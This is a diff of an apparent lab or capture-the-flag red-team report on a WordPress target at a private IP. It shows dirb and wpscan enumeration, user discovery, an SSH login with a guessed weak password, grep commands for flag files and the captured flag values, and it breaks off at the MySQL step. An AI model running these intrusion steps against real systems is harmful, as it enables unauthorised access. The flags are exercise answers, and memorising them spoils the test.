@@ -28,10 +28,40 @@ The following vulnerabilities were identified on each target:
 The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
 
 
-flag1{b9bbcb33e11b80be759c4e844862482d}
+**flag1{b9bbcb33e11b80be759c4e844862482d}**
 - Tools used: dirb, wpscan  
 -- Using dirb we were able to find a wordpress page: 192.168.1.110/wordpress  
 -- From there we ran wpscan: 
 ~~~
 wpscan –url http://192.168.1.110/wordpress
 ~~~
+[picture]
+
+-- We then found two login names: Steven and Michael  
+[picture]  
+-- By sheer luck, we guessed the password without brute force:  
+-- ssh michael@192.168.1.110
+-- Password:  michael
+--  Commands:
+~~~
+cd ../../var/www/html
+grep -RE flag1
+~~~
+
+**flag2{fc3fd58dcdad9ab23faca6e9a36e581c}**
+- Follow same steps as flag 1
+~~~ 
+cd ../../var/www/
+grep -RE flag2
+~~~
+
+Follow same steps as flag 1
+cd ../../var/www/
+grep -RE flag2
+Flag 3,4 from MySQL:
+Tools used: SSH, MySQL
+ssh michael@192.168.1.110
+Password: michael
+cd /var/www/html/wordpress
+
+
